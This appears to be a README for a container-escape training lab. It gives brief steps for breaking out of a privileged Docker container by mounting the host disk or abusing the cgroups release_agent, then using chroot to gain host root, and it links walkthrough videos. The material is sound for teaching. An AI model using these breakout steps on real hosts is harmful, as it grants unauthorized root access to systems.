# Container Breakout, Kubernetes & Cloud Metadata Lab

## Overview
Break out of isolated containers onto the underlying host VM by exploiting privileged flags, mounted Docker sockets, and Linux capabilities.

- **Default Port / Access**: `Terminal / CLI`
- **Directory**: `Real_World_Industry_Labs/02_cloud_k8s_container_escape/badrobot_k8s_escape`

---

## How to Solve & Practice

1. Start the container: `docker compose up -d`
2. Enter container shell: `docker exec -it cyberlab_realworld_container_escape sh`.
3. Check privileges & capabilities: `capsh --print` (look for `CAP_SYS_ADMIN`).
4. Privileged Breakout: Mount host root filesystem: `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host` or abuse `cgroups release_agent`.
5. Examine host files: `chroot /mnt/host` to obtain full root on host machine.

---

## YouTube Walkthroughs & Solving Guides

- [John Hammond - Docker Containers: How Hackers Can ESCAPE Them in Seconds](https://www.youtube.com/watch?v=giXlSlFLKwA)
- [AppSecEngineer - Docker Privilege Escalation: Breaking Out of Containers](https://www.youtube.com/watch?v=WEiCTxaHw5k)
- [David Bombal - How to Exploit Docker Containers with a Volume Mount Attack](https://www.youtube.com/watch?v=bHAdqnaRX0s)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
